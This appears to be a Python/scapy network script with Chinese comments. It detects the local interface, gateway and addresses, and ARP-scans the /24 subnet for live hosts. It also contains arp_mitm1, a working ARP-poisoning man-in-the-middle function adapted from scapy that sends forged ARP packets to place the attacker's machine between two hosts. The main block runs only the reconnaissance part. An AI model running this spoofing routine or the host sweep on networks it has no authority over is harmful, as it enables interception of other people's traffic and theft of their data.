import scapy
import re
import sys
import os
from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP, getmacbyip
from scapy.all import ifaces, conf, srp, get_if_addr, get_if_hwaddr, sendp, srploop


class HiddenPrints:
    def __enter__(self):
        self._original_stdout = sys.stdout
        sys.stdout = open(os.devnull, 'w')

    def __exit__(self, exc_type, exc_val, exc_tb):
        sys.stdout.close()
        sys.stdout = self._original_stdout


def get_real_iface_name():
    # 从ifaces命令打印结果里，按行解析每行的属性（第一行为属性行），结果放入字典的列表iface_dict_list
    iface_dict_list, iface_keys = [], []
    for idx, line in enumerate(str(ifaces).split('\n')):
        items_in_line = list(filter(None, re.split(r'\s{2,}', line)))  # 每行里面有2个及以上空格进行分割
        if len(items_in_line) < 2:
            continue
        if idx == 0:
            iface_keys = items_in_line
        else:
            iface_dict = {}
            for i, key in enumerate(iface_keys):
                if i < len(items_in_line):
                    iface_dict[key] = items_in_line[i]
            iface_dict_list.append(iface_dict)

    ignore_keywords = ['virtual', 'miniport', 'loopback', 'vmware']
    real_iface_list = list(filter(
        lambda iface: all([False if keyword in iface['Name'].lower() else True for keyword in ignore_keywords]),
        iface_dict_list))
    real_iface_name = real_iface_list[0]['Name']
    return real_iface_name


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:  # 返回从响应数据中获取的Mac地址
        return r[Ether].src
    return None


# 获取网关IP地址，参考：https://scapy.readthedocs.io/en/latest/routing.html#get-mac-by-ip
def get_gateway_ip():
    return conf.route.route('0.0.0.0')[2]


def get_local_ip():
    return get_if_addr(get_real_iface_name())

def get_living_hosts_by_arp_ping():
    # 使用ARP Ping的方式，快速获取本地局域网中的存活主机IP地址列表
    local_ip_addr = get_if_addr(get_real_iface_name())
    subnet_str = local_ip_addr[:local_ip_addr.rindex('.') + 1] + '0/24'  # C类子网地址，例如x.x.x.0/24
    # srp() 的参数verbose=0表示不打印输出
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet_str), timeout=2, verbose=0)
    living_hosts_dict = {}
    for s, r in responses:  # 返回从响应数据中获取的Mac地址
        # print(s, '-------', r[ARP].psrc, '----', r[Ether].src)
        living_hosts_dict[r[ARP].psrc] = r[Ether].src

    return list(living_hosts_dict.keys())


# a simplified version of method arp_mitm() in scapy.layers.l2 package
def arp_mitm1(ip1, ip2, mac1=None, mac2=None, target_mac=None, iface=None, inter=3):
    if not iface:
        iface = conf.route.route(ip1)[0]
    if not target_mac:
        target_mac = get_if_hwaddr(iface)
    if mac1 is None:
        mac1 = getmacbyip(ip1)
        if not mac1:
            print("Can't resolve mac for %s" % ip1)
            return
    if mac2 is None:
        mac2 = getmacbyip(ip2)
        if not mac2:
            print("Can't resolve mac for %s" % ip2)
            return
    print("MITM on %s: %s <--> %s <--> %s" % (iface, mac1, target_mac, mac2))
    # We loop who-has requests
    srploop(
        [
            Ether(dst=mac1, src=target_mac) /
            ARP(op="who-has", psrc=ip2, pdst=ip1,
                hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff"),
            Ether(dst=mac2, src=target_mac) /
            ARP(op="who-has", psrc=ip1, pdst=ip2,
                hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff")
        ],
        filter="arp and arp[7] = 2",
        inter=inter,
        iface=iface,
        timeout=0.5,
        verbose=2,
        store=0,
    )
    print("Restoring...")
    sendp([
        Ether(dst=mac1, src=target_mac) /
        ARP(op="who-has", psrc=ip2, pdst=ip1,
            hwsrc=mac2, hwdst="ff:ff:ff:ff:ff:ff"),
        Ether(dst=mac2, src=target_mac) /
        ARP(op="who-has", psrc=ip1, pdst=ip2,
            hwsrc=mac1, hwdst="ff:ff:ff:ff:ff:ff")
    ], iface=iface)


if __name__ == '__main__':
    print('-' * 65)
    print('Scapy version {}, using iface "{}"'.format(scapy.VERSION, get_real_iface_name()))
    print('本机IP地址：\t {:<20}'.format(get_if_addr(get_real_iface_name())))
    print('本地MAC地址：\t {:<20}'.format(get_if_hwaddr(get_real_iface_name())))
    print('默认网关地址：\t {:<20}'.format(get_gateway_ip()))
    print('-' * 65)

    print('本地局域网存活主机列表：{}'.format(get_living_hosts_by_arp_ping()))



